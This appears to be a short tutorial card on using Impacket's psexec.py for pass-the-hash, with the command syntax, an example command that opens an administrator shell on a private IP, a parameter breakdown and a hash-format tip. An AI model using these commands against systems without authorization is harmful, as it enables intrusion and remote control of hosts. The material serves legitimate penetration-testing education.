Impacket psexec.py Usage
impacket-psexec -hashes <LM_HASH>:<NT_HASH> <username>@<target_ip> cmd.exe

# Example: Gain a remote shell as administrator
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.101 cmd.exe
Command Breakdown

Understanding the Parameters

  • -hashes <LM_HASH>:<NT_HASH>: Specifies the LM and NTLM hashes for authentication. The LM hash can often be a placeholder if not available.
  • <username>@<target_ip>: Defines the target user and IP address for remote execution.
  • cmd.exe: The command to execute on the remote system, typically to open a command shell.
How It Works

PsExec Protocol Exploitation

`psexec.py` mimics the behavior of Microsoft's PsExec utility. It establishes a connection to the target, uploads a service executable, starts it with the provided hash, and then pipes input/output to your local terminal, granting a remote shell.

Common Mistake

Incorrect Hash Format

Ensure the hashes are correctly formatted as LM:NT. If the LM hash is unknown or disabled, use the standard placeholder `aad3b435b51404eeaad3b435b51404ee` to avoid authentication errors.

Key Takeaway

`impacket-psexec` is a primary tool for PtH, enabling remote command execution by supplying NTLM hashes directly, bypassing plaintext password requirements.
